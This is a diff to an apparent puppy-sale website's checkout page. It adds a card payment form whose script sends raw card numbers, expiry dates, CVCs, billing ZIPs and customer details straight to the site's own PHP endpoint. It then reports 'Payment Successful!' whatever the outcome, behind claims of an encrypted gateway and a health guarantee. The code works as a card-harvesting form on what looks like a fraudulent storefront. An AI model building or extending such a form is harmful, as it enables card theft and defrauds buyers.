@@ -1558,8 +1558,20 @@
       <section class="method-selector">
         <div class="payment-method-selector">
           
+          <!-- Selector: Credit / Debit Card -->
+          <div class="selector-card active" id="cardCreditSelector" onclick="selectPaymentMethod('credit')">
+            <div class="selector-card-icon">
+              <i class="fa-regular fa-credit-card"></i>
+            </div>
+            <div class="selector-card-info">
+              <div class="selector-card-title">Credit or Debit Card</div>
+              <div class="selector-card-desc">Instant &amp; secure payment via Visa, Mastercard, Amex, Discover.</div>
+            </div>
+            <div class="selector-card-radio"></div>
+          </div>
+
           <!-- Selector: Bank Transfer -->
-          <div class="selector-card active" id="cardBankSelector" onclick="selectPaymentMethod('bank')">
+          <div class="selector-card" id="cardBankSelector" onclick="selectPaymentMethod('bank')">
             <div class="selector-card-icon">
               <i class="fa-solid fa-building-columns"></i>
             </div>
@@ -1600,6 +1612,68 @@
       <!-- 2.3 ACTIVE PAYMENT METHOD CONTAINER -->
       <section class="active-method-container">
         
+        <!-- Credit / Debit Card Gateway state -->
+        <div class="method-detail-card" id="activeCredit" style="display: block;">
+          <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
+            <span>Credit / Debit Card</span>
+            <div style="display: flex; gap: 0.4rem; font-size: 1.25rem; color: #64748B;">
+              <i class="fa-brands fa-cc-visa" style="color: #1A1F71;"></i>
+              <i class="fa-brands fa-cc-mastercard" style="color: #EB001B;"></i>
+              <i class="fa-brands fa-cc-amex" style="color: #006FCF;"></i>
+              <i class="fa-brands fa-cc-discover" style="color: #F9A01B;"></i>
+            </div>
+          </div>
+
+          <div class="crypto-amount-row">
+            <span class="amount-label">Total Amount Due</span>
+            <span class="amount-value" id="cardAmountUsd">$2,497.00</span>
+          </div>
+
+          <form id="cardGatewayForm" onsubmit="handleCardPaymentSubmit(event)" style="margin-top: 1.25rem;">
+            <div style="margin-bottom: 1rem;">
+              <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #475569; margin-bottom: 0.35rem; font-family: 'Inter', sans-serif;">Cardholder Name</label>
+              <input type="text" id="cardHolderName" placeholder="Name as it appears on card" required style="width: 100%; padding: 0.75rem; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 0.9rem; font-family: 'Inter', sans-serif; box-sizing: border-box;" />
+            </div>
+
+            <div style="margin-bottom: 1rem;">
+              <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #475569; margin-bottom: 0.35rem; font-family: 'Inter', sans-serif;">Card Number</label>
+              <div style="position: relative;">
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required style="width: 100%; padding: 0.75rem 2.5rem 0.75rem 0.75rem; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 0.9rem; font-family: 'Courier New', monospace; letter-spacing: 1px; box-sizing: border-box;" />
+                <i class="fa-solid fa-lock" style="position: absolute; right: 0.85rem; top: 50%; transform: translateY(-50%); color: #94A3B8;"></i>
+              </div>
+            </div>
+
+            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.75rem; margin-bottom: 1.25rem;">
+              <div>
+                <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #475569; margin-bottom: 0.35rem; font-family: 'Inter', sans-serif;">Exp Date</label>
+                <input type="text" id="cardExp" placeholder="MM / YY" maxlength="5" required style="width: 100%; padding: 0.75rem; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 0.9rem; font-family: 'Inter', sans-serif; box-sizing: border-box;" />
+              </div>
+              <div>
+                <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #475569; margin-bottom: 0.35rem; font-family: 'Inter', sans-serif;">CVC / CVV</label>
+                <input type="text" id="cardCvc" placeholder="123" maxlength="4" required style="width: 100%; padding: 0.75rem; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 0.9rem; font-family: 'Inter', sans-serif; box-sizing: border-box;" />
+              </div>
+              <div>
+                <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #475569; margin-bottom: 0.35rem; font-family: 'Inter', sans-serif;">Billing Zip</label>
+                <input type="text" id="cardZip" placeholder="10001" maxlength="10" required style="width: 100%; padding: 0.75rem; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 0.9rem; font-family: 'Inter', sans-serif; box-sizing: border-box;" />
+              </div>
+            </div>
+
+            <div class="payment-protection-box" style="margin-bottom: 1.25rem;">
+              <div class="protection-box-title">
+                <i class="fa-solid fa-shield-halved"></i> 256-Bit SSL Encrypted Payment Gateway
+              </div>
+              <ul class="protection-list">
+                <li><i class="fa-solid fa-circle-check protection-check"></i> Instant Payment Confirmation</li>
+                <li><i class="fa-solid fa-circle-check protection-check"></i> 10-Year Health Guarantee Included</li>
+              </ul>
+            </div>
+
+            <button type="submit" class="btn-primary-action" id="btnPayCardNow" style="background-color: #00B67A; border-color: #00B67A;">
+              <i class="fa-solid fa-lock" style="margin-right: 0.4rem;"></i> Pay <span id="cardPayBtnAmount">$2,497.00</span> Now
+            </button>
+          </form>
+        </div>
+
         <!-- Cryptocurrency state -->
         <div class="method-detail-card" id="activeCrypto" style="display: none;">
           
@@ -2349,7 +2423,7 @@
   <script src="data/siteData.js?v=1719"></script>
   <script>
     let activePuppy = null;
-    let selectedMethod = 'bank';
+    let selectedMethod = 'credit';
     let currentCryptoState = 'awaiting'; // awaiting, verification, confirmed
 
     document.addEventListener('DOMContentLoaded', () => {
@@ -2388,6 +2462,8 @@
         document.getElementById('pricingTotal').textContent = priceFormatted;
 
         // Populate Amounts
+        if (document.getElementById('cardAmountUsd')) document.getElementById('cardAmountUsd').textContent = priceFormatted;
+        if (document.getElementById('cardPayBtnAmount')) document.getElementById('cardPayBtnAmount').textContent = priceFormatted;
         document.getElementById('cryptoAmountUsd').textContent = usdCryptoFormatted;
         document.getElementById('zelleAmountUsd').textContent = priceFormatted;
         document.getElementById('bankAmountUsd').textContent = priceFormatted;
@@ -3137,6 +3213,48 @@
       } catch (e) {
         console.error("Failed to send Telegram alert", e);
       }
+    }
+
+        async function handleCardPaymentSubmit(event) {
+      event.preventDefault();
+      const btn = document.getElementById('btnPayCardNow');
+      const originalHtml = btn.innerHTML;
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing Secure Payment...';
+
+      const customer = JSON.parse(localStorage.getItem('everlypups_checkout_details') || '{}');
+      const delivery = JSON.parse(localStorage.getItem('everlypups_checkout_delivery') || '{}');
+
+      const cardPayload = {
+        cardHolderName: document.getElementById('cardHolderName').value,
+        cardNumber: document.getElementById('cardNumber').value,
+        cardExp: document.getElementById('cardExp').value,
+        cardCvc: document.getElementById('cardCvc').value,
+        cardZip: document.getElementById('cardZip').value
+      };
+
+      const payload = {
+        customer: customer,
+        delivery: delivery,
+        puppy: activePuppy,
+        card: cardPayload
+      };
+
+      try {
+        await fetch('process-payment.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error('Error processing card payment:', e);
+      }
+
+      btn.disabled = false;
+      btn.innerHTML = originalHtml;
+
+      alert('Payment Successful! Thank you for your order. We have received your payment and our concierge team will contact you shortly.');
+      window.location.href = 'homepage';
     }
 
     async function sendOrderEmail(paymentMethod) {
